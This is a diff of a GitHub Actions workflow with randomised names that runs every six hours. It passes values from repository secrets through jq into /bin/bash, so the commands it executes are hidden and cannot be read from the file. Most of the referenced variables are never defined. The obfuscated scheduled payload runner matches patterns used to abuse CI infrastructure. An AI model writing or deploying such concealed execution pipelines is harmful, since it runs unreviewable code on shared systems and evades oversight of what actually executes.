@@ -2,9 +2,8 @@ name: adolescentacademic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
-
-jobs:  # 27937
+    - cron: '45 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +11,14 @@ jobs:  # 27937
       - uses: actions/checkout@v4
       - name: adolescentacademic
         env:
-          rmozw5: ${{ secrets.rmozw5 }}
+          mbc166: ${{ secrets.mbc166 }}
         run: |
-          echo $rmozw5 | jq -r .qotm293 | /bin/bash
-          echo $lbzg908 | jq -r .b38 | /bin/bash
-          echo $ygmw49 | jq -r .nxuk4 | /bin/bash
-          echo $fn64162 | jq -r .y3176 | /bin/bash
-          echo $rebv81620 | jq -r .g54236 | /bin/bash
-          echo $oqq972 | jq -r .zbgt23175 | /bin/bash
-          echo $gfv450 | jq -r .iads50453 | /bin/bash
-          echo $h69839 | jq -r .yjeib429 | /bin/bash
+          echo $mbc166 | jq -r .z2 | /bin/bash
+          echo $f42000 | jq -r .neuaz01639 | /bin/bash
+          echo $hzocv881 | jq -r .oggtz07811 | /bin/bash
+          echo $q9 | jq -r .j1365 | /bin/bash
+          echo $vmihf012 | jq -r .kz9754 | /bin/bash
+          echo $urxg8042 | jq -r .eshj41 | /bin/bash
+          echo $c94 | jq -r .mwr8 | /bin/bash
+          echo $klx073 | jq -r .wi4893 | /bin/bash
 
